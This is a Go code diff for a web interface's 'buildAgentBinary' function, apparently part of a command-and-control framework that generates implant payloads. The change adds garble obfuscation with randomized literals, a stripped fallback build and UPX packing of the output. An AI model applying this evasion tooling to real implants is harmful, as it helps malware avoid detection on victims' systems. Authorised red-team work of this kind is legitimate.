@@ -194,11 +194,14 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 	// Find project root
 	projectRoot := findRoot()
 
-	var cmd *exec.Cmd
+	built := false
+
 	if obfuscate {
-		garblePath, err := exec.LookPath("garble")
-		if err != nil {
-			// Check common install locations
+		// Try garble first
+		garblePath := ""
+		if p, err := exec.LookPath("garble"); err == nil {
+			garblePath = p
+		} else {
 			home, _ := os.UserHomeDir()
 			for _, c := range []string{
 				filepath.Join(home, "go", "bin", "garble"),
@@ -207,26 +210,45 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 			} {
 				if _, e := os.Stat(c); e == nil {
 					garblePath = c
-					err = nil
 					break
 				}
 			}
-			if err != nil {
-				return PayloadResponse{Success: false, Message: "garble not installed: go install mvdan.cc/garble@latest"}
+		}
+
+		if garblePath != "" {
+			garbleCmd := exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
+				"build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
+			garbleCmd.Dir = projectRoot
+			garbleCmd.Env = append(env, "GOTOOLCHAIN=local")
+			if _, err := garbleCmd.CombinedOutput(); err == nil {
+				built = true
 			}
 		}
-		cmd = exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
-			"build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
-	} else {
-		cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
+
+		if !built {
+			// Fallback: stripped build + UPX compression
+			fallbackCmd := exec.Command("go", "build", "-ldflags", ldflags+" -s -w", "-trimpath", "-o", outputPath, "./cmd/agent")
+			fallbackCmd.Dir = projectRoot
+			fallbackCmd.Env = env
+			if out, err := fallbackCmd.CombinedOutput(); err != nil {
+				return PayloadResponse{Success: false, Message: fmt.Sprintf("build failed: %s", strings.TrimSpace(string(out)))}
+			}
+			built = true
+		}
+
+		// UPX pack for smaller size
+		if upxPath, err := exec.LookPath("upx"); err == nil {
+			exec.Command(upxPath, "-9", "-q", outputPath).Run()
+		}
 	}
 
-	cmd.Dir = projectRoot
-	cmd.Env = env
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return PayloadResponse{Success: false, Message: fmt.Sprintf("Build failed: %s\n%s", err, string(output))}
+	if !built {
+		buildCmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
+		buildCmd.Dir = projectRoot
+		buildCmd.Env = env
+		if out, err := buildCmd.CombinedOutput(); err != nil {
+			return PayloadResponse{Success: false, Message: fmt.Sprintf("Build failed: %s\n%s", err, string(out))}
+		}
 	}
 
 	info, _ := os.Stat(outputPath)
